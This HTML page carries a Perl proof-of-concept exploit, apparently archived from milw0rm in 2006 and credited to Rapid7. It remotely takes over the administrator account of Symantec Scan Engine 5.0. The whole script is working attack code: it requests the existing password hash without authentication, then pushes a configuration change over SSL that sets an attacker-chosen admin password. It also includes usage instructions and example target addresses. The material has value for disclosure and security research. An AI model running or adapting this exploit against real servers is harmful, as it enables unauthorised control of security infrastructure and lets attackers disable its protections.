<html><head><title>Symantec Scan Engine 5.0.x.x Change Admin Password Remote Exploit</title></head><pre>#!/usr/bin/perl -w
#
# Remotely change the administrator password (or password hash) of
# Symantec Scan Engine.
#
# Author: Marc Bevand of Rapid7 &lt;marc_bevand(at)rapid7.com&gt;
# Copyright 2006 Rapid7, LLC. All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
#
#   1. Redistributions of source code must retain the above copyright
#   notice, this list of conditions and the following disclaimer.
#
#   2. Redistributions in binary form must reproduce the above
#   copyright notice, this list of conditions and the following
#   disclaimer in the documentation and/or other materials provided
#   with the distribution.
#
#   THIS SOFTWARE IS PROVIDED BY RAPID7, LLC ``AS IS'' AND ANY EXPRESS
#   OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
#   WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
#   ARE DISCLAIMED. IN NO EVENT SHALL RAPID7, LLC BE LIABLE FOR ANY
#   DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
#   DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
#   GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
#   INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
#   WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
#   NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
#   SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#

use strict;
use Getopt::Long;
use LWP::UserAgent;
use Digest::MD5 qw/md5_hex/;
use Net::SSLeay::Handle qw/shutdown/;

#
# Init LWP::UserAgent (the user agent string is the one currently used
# by the Scan Engine java applet).
#
sub init {
  my $ua;
  $ua = LWP::UserAgent-&gt;new(keep_alive =&gt; 0);
  $ua-&gt;agent(&quot;Mozilla/4.0 (Windows 2000 5.0) Java/1.4.2_08&quot;);
  return $ua;
}

#
# Example of service string to be parsed:
# 10.68.4.4
# 10.68.4.4/8004/8005
# hostname
# hostname/9004/9005
#
sub parse_service {
  my ($service) = @_;

  if ($service =~ m{^([^/]*)/(\d+)/(\d+)$}) {
     return $1, $2, $3;
  } elsif ($service =~ m{^([^/]*)$}) {
     return $1, 8004, 8005;
  } else {
     die &quot;cannot parse service: $service&quot;;
  }
}

#
# Sends a request to obtain the password hash. Note: the RSA key
# (modulus and public exponent) has been randomly chosen.
#
sub data_to_send {
  my $r1 =
  '&lt;request&gt;&lt;key mod=&quot;784607708866372110095636553206565253692059085'.
  '0882661452379500719255245078226751123858547991180612629396444366'.
  '109364669329014831409765373165312900564995261&quot; pub=&quot;754297542068'.
  '3822223796790522532950961415568940207500046396606172395479254814'.
  '3383744922039888710333203519260280729415961892539564611703079983'.
  '74406014351745&quot;&gt;I need the key&lt;/key&gt;&lt;/request&gt;'
  ;

  return $r1;
}

#
# Example of response to be parsed:
# &lt;request&gt;
#   &lt;message xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;
#     xmlns:java=&quot;class:com.symantec.common.SimpleRSA&quot;
#     value=&quot;01234567890123456789012345678901234567890123456789012345\
# 6789&quot;/&gt;
#   &lt;password xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;
#     xmlns:java=&quot;class:com.symantec.common.SimpleRSA&quot;
#     pass=&quot;86B7A1FE120C0279971559B6BAC8C5713EF580BAFD20168D622B7E170\
# D248642&quot;/&gt;
# &lt;/request&gt;
#
sub parse_resp {
  my ($res) = @_;

  if ($res =~ /pass=&quot;([[:xdigit:]]{64})&quot;/) {
     return $1;
  } else {
     die &quot;cannot parse response: $res&quot;;
  }
}

#
# Return a password hash.
#
sub hash_passwd {
  my ($pwd) = @_;
  my $salt = sprintf &quot;%08X%08X%08X%08X&quot;, rand(0xffffffff),
  rand(0xffffffff), rand(0xffffffff), rand(0xffffffff);

  return uc(md5_hex(&quot;$pwd$salt&quot;)) . $salt;
}

sub send_request {
  my ($socket, $req) = @_;

  $req = pack(&quot;n&quot;, length($req)).$req;
  print $socket $req;
}

#
# Set the administrator password hash.
#
sub set_hash {
  my ($hostname, $port_ssl, $hash) = @_;
  my $socket;
  my $reply;

  tie(*SSL, &quot;Net::SSLeay::Handle&quot;, $hostname, $port_ssl)
     or die &quot;ssl tie: $!&quot;;
  $socket = \*SSL;
  send_request($socket,
     '&lt;request command=&quot;submit&quot; parms=&quot;apply&quot; type=&quot;saveapply&quot;&gt;'.
     '&lt;![CDATA[&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;'.
     '&lt;guichanges&gt;&lt;configuration&gt;'.
     '&lt;changes xpath=&quot;//admin/password/@value&quot; value=&quot;'.$hash.'&quot;/&gt;'.
     '&lt;/configuration&gt;&lt;/guichanges&gt;'.
     ']]&gt;&lt;/request&gt;');
  send_request($socket,
     'UTFWritesDone');
  shutdown($socket, 1) or die &quot;ssl shutdown: $!&quot;;
  $reply = substr(&lt;$socket&gt;, 2);
  $reply = substr($reply, 0, index($reply, 'UTFWritesDone') - 2);
  if ($reply !~ m{&lt;message status='apply_success'&gt;Apply!&lt;/message&gt;})
  {
     die &quot;command failed: $reply&quot;;
  }
  close($socket) or die &quot;ssl close: $!&quot;;
}

sub doit {
  my ($service, $pwd, $hash) = @_;
  my $hostname;
  my $port_http;
  my $port_ssl;
  my $ua;
  my $url;
  my $req;
  my $res;
  my $old_hash;

  ($hostname, $port_http, $port_ssl) = parse_service($service);
  $ua = init();
  $url = &quot;http://$hostname:$port_http/xml.xml&quot;;
  $req = HTTP::Request-&gt;new(POST =&gt; $url);
  $req-&gt;content_type('application/x-www-form-urlencoded');
  $req-&gt;content(data_to_send());
  $res = $ua-&gt;request($req);
  $res-&gt;is_success or die &quot;got &quot;.$res-&gt;status_line.&quot; for $url\n&quot;;
  ($old_hash) = parse_resp($res-&gt;content);
  print &quot;Old hash: $old_hash\n&quot;;
  if ($hash) {
     set_hash($hostname, $port_ssl, $hash);
     print &quot;New hash: $hash\n&quot;;
  } else {
     $hash = hash_passwd($pwd);
     set_hash($hostname, $port_ssl, $hash);
     print &quot;New hash: $hash\n&quot;;
     print &quot;Password successfully set to: '$pwd'\n&quot;;
  }
}

sub error {
  print STDERR &quot;Try `$0 --help' for more information.\n&quot;;
}

sub usage {
  print &quot;Usage:\n&quot;.
  &quot;  $0 [OPTIONS] &lt;hostname&gt;\n&quot;.
  &quot;  $0 [OPTIONS] &lt;hostname&gt;/&lt;http_port&gt;/&lt;ssl_port&gt;\n&quot;.
  &quot;Options:\n&quot;.
  &quot;  --help                Display this help\n&quot;.
  &quot;  --pwd &lt;passwd&gt;        Set the password (default: test)\n&quot;.
  &quot;  --hash &lt;passwd_hash&gt;  Set the password hash instead of a parti&quot;.
  &quot;cular password\n&quot;.
  &quot;Examples:\n&quot;.
  &quot;  $0 10.68.4.4\n&quot;.
  &quot;  $0 --pwd foobar 10.68.4.4/8004/8005\n&quot;.
  &quot;&quot;;
}

sub main {
  my $help;
  my $pwd = &quot;test&quot;;
  my $hash;
  my $service;

  if (!GetOptions(
        &quot;help&quot; =&gt; \$help,
        &quot;pwd=s&quot; =&gt; \$pwd,
        &quot;hash=s&quot; =&gt; \$hash,
     )) {
     error(); exit(1);
  }
  if ($help) {
     usage(); exit(0);
  }
  if (!scalar(@ARGV)) {
     print STDERR &quot;No service specified.\n&quot;;
     error(); exit(1);
  } elsif (1 == scalar(@ARGV)) {
     $service = $ARGV[0];
  } else {
     print STDERR &quot;Extra argument: $ARGV[1]\n&quot;;
     error(); exit(1);
  }
  doit($service, $pwd, $hash);
}

main();

#
# END proof of concept
#

# milw0rm.com [2006-04-21]</pre></html>